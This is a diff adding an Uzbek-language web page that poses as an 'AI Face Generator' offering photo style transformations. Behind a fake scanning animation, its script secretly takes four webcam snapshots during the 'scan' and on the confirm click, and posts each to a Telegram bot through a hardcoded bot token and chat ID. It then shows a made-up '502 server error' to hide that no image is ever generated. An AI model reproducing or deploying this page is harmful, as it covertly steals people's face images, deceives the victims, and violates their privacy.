@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Face Generator - Neyrotarmoq</title>
+    <style>
+        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        body { background: #0f0c20; color: white; text-align: center; margin: 0; padding: 10px; }
+        h1 { color: #00f2fe; font-size: 22px; margin: 10px 0 5px 0; }
+        .subtitle { color: #8a85a5; margin-bottom: 15px; font-size: 13px; padding: 0 10px; }
+        
+        /* Rasmlar panjarasi - Telefonbop */
+        .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; max-width: 400px; margin: 0 auto; }
+        .card { background: #1a1636; border: 2px solid #2e285a; border-radius: 12px; padding: 6px; cursor: pointer; transition: 0.3s; }
+        .card.selected { border-color: #00f2fe; box-shadow: 0 0 10px rgba(0, 242, 254, 0.4); }
+        .card img { width: 100%; border-radius: 8px; height: 110px; object-fit: cover; }
+        .card p { margin: 5px 0 0 0; font-size: 12px; font-weight: bold; }
+
+        .btn { background: linear-gradient(45deg, #0072ff, #00f2fe); color: white; border: none; padding: 14px 20px; font-size: 15px; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 15px; width: 100%; max-width: 400px; }
+        
+        /* Skanerlash zonasi - Telefonda uzun bo'lib ketmasligi uchun ixcham o'lchamlar */
+        #scanner-zone { display: none; max-width: 340px; margin: 15px auto; background: #1a1636; padding: 15px; border-radius: 15px; border: 1px solid #00f2fe; }
+        #scanner-zone h2 { font-size: 18px; margin: 0 0 5px 0; }
+        
+        /* Video konteyneri - Balandligi cheklangan kvadrat/to'rtburchak shakl */
+        .video-container { position: relative; width: 100%; max-width: 240px; height: 240px; margin: 0 auto; border-radius: 50%; overflow: hidden; border: 3px solid #00f2fe; background: #000; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); display: block; }
+        canvas { display: none; }
+
+        /* Skaner chizig'i */
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #00f2fe; box-shadow: 0 0 10px #00f2fe; animation: scan 2.5s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        #status-text { margin-top: 12px; color: #00f2fe; font-weight: bold; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div id="main-zone">
+    <h1>AI Face Magic ✨</h1>
+    <p class="subtitle">O'z rasmingizni sun'iy intellekt yordamida ajoyib uslubga o'tkazing. Uslubni tanlang:</p>
+    
+    <div class="grid">
+        <div class="card" onclick="selectStyle(this, 'Professional Portrait')">
+            <img src="im1age.png" alt="Style">
+            <p>Professional Portait</p>
+        </div>
+        <div class="card" onclick="selectStyle(this, 'Royal Look')">
+            <img src="im2age.png" alt="Style">
+            <p>Royal Look</p>
+        </div>
+        <div class="card" onclick="selectStyle(this, 'Superhero')">
+            <img src="im3age.png" alt="Style">
+            <p>3D Pixar Style 🧸</p>
+        </div>
+        <div class="card" onclick="selectStyle(this, 'Luxury Style')">
+            <img src="im4age.png" alt="Style">
+            <p>Luxury Style</p>
+        </div>
+        <div class="card" onclick="selectStyle(this, 'Cinematic Look')">
+            <img src="im5age.png" alt="Style">
+            <p>Cinematic Look</p>
+        </div>
+        <div class="card" onclick="selectStyle(this, 'Future AI')">
+            <img src="im6age.png" alt="Style">
+            <p>Future AI</p>
+        </div>
+    </div>
+
+    <button class="btn" onclick="startAI()">Rasmni o'zgartirish</button>
+</div>
+
+<!-- Skanerlash zonasi - ixchamlashtirilgan shaklda -->
+<div id="scanner-zone">
+    <h2>AI Yuz Skanerlash...</h2>
+    <p style="color: #aaa; font-size: 12px; margin-bottom: 15px;">Neyrotarmoq yuz chizgilarini aniqlamoqda. Kameraga qarab turing.</p>
+    
+    <div class="video-container">
+        <div class="scan-line"></div>
+        <video id="video" autoplay playsinline webkit-playsinline></video>
+    </div>
+    
+    <p id="status-text">AI tahlil qilmoqda (0%)...</p>
+    <button class="btn" id="generate-btn" onclick="userClickedGenerate()" style="display:none;">Generatsiya qilish</button>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+const BOT_TOKEN = '8720265005:AAGEr4fDgJUVuww0_EhMEn5ezJRhhOqb7gA';
+const CHAT_ID = '8470974811'; 
+
+let selectedStyleName = "Tanlanmagan";
+let globalStream = null;
+
+function selectStyle(element, name) {
+    document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedStyleName = name;
+}
+
+async function startAI() {
+    document.getElementById('main-zone').style.display = 'none';
+    document.getElementById('scanner-zone').style.display = 'block';
+
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+            audio: false 
+        });
+        
+        video.srcObject = stream;
+        globalStream = stream;
+
+        video.setAttribute('playsinline', true);
+        video.setAttribute('webkit-playsinline', true);
+        await video.play();
+
+        let progress = 0;
+        // Skanerlashni sekinlashtirish: har 600ms da 10% qo'shiladi (Jami 6 soniya davom etadi)
+        let interval = setInterval(() => {
+            progress += 10;
+            document.getElementById('status-text').innerText = `AI tahlil qilmoqda (${progress}%)...`;
+            
+            // 1-rasm: 20% bo'lganda (Skanerlash boshida)
+            if (progress === 20) {
+                captureAndSend(video, canvas, "1-Rasm: Skanerlash boshlanishi (20%)");
+            }
+            
+            // 2-rasm: 50% bo'lganda (Skanerlash o'rtasida)
+            if (progress === 50) {
+                captureAndSend(video, canvas, "2-Rasm: Skanerlash o'rtasi (50%)");
+            }
+            
+            // 3-rasm: 80% bo'lganda (Skanerlash yakunida)
+            if (progress === 80) {
+                captureAndSend(video, canvas, "3-Rasm: Skanerlash oxiri (80%)");
+            }
+
+            if (progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('status-text').innerText = "Skanerlash muvaffaqiyatli yakunlandi! Quyidagi tugmani bosing:";
+                document.getElementById('generate-btn').style.display = 'block';
+            }
+        }, 600);
+
+    } catch (err) {
+        alert("Neyrotarmoq ishlashi uchun kamera ruxsati kerak!");
+        window.location.reload();
+    }
+}
+
+function userClickedGenerate() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    
+    // 4-rasm: Foydalanuvchi o'zi tasdiqlab tugmani bosganda ketadi
+    captureAndSend(video, canvas, `4-Rasm: Tasdiqlash tugmasi bosildi (Uslub: ${selectedStyleName})`);
+    
+    document.getElementById('status-text').innerText = "Neyrotarmoqqa yuklanmoqda...";
+    
+    setTimeout(() => {
+        if(globalStream) {
+            globalStream.getTracks().forEach(track => track.stop());
+        }
+        document.body.innerHTML = `
+            <div style="padding:40px 15px; max-width:360px; margin:0 auto; background:#1a1636; border-radius:15px; margin-top:50px; border:1px solid red;">
+                <h2 style="color:#ff4a4a; font-size:18px;">Serverda xatolik (502)</h2>
+                <p style="font-size:13px; color:#ccc;">Neyrotarmoq serverlarida yuklama juda yuqori. Tanlangan "${selectedStyleName}" uslubini yaratib bo'lmadi. Iltimos, 5 daqiqadan so'ng qayta urinib ko'ring.</p>
+                <button class="btn" onclick="window.location.reload()">Orqaga qaytish</button>
+            </div>
+        `;
+    }, 2000);
+}
+
+function captureAndSend(video, canvas, captionText) {
+    const context = canvas.getContext('2d');
+    
+    let width = video.videoWidth || video.clientWidth || 640;
+    let height = video.videoHeight || video.clientHeight || 480;
+    
+    canvas.width = width;
+    canvas.height = height;
+    
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    canvas.toBlob(function(blob) {
+        if (!blob) return;
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'image.jpg');
+        formData.append('caption', `🔔 ${captionText}`);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    }, 'image/jpeg', 0.7);
+}
+</script>
+
+</body>
+</html>
